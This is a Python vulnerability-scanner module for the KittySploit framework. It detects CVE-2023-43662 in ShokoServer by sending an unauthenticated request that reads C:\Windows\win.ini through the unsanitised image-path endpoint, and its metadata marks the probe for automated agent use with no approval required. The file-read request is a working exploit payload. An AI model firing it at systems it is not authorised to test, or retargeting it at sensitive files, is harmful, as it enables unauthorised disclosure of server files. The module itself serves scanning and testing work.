#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ShokoServer is a media server which specializes in organizing anime."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ShokoServer System - Local File Inclusion (LFI) Detection',
        'description': 'ShokoServer is a media server which specializes in organizing anime. In affected versions the `/api/Image/WithPath` endpoint is accessible without authentication and is supposed to return default server images. The endpoint accepts the parameter `serverImagePath`, which is not sanitized in any way before being passed to `System.IO.File.OpenRead`, which results in an arbitrary file read.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'shoko', 'web-aui', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/Ncast%E9%AB%98%E6%B8%85%E6%99%BA%E8%83%BD%E5%BD%95%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
            'https://github.com/ShokoAnime/ShokoServer/commit/6c57ba0f073d6be5a4f508c46c2ce36727cbce80',
        ],
        'cve': 'CVE-2023-43662',
    }

    def run(self):
        path = '/api/Image/withpath/C:\\Windows\\win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        ctype_any = ('text/plain',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='high',
                reason='ShokoServer System - Local File Inclusion (LFI) detected',
                path=path,
            )
            return True
        return False

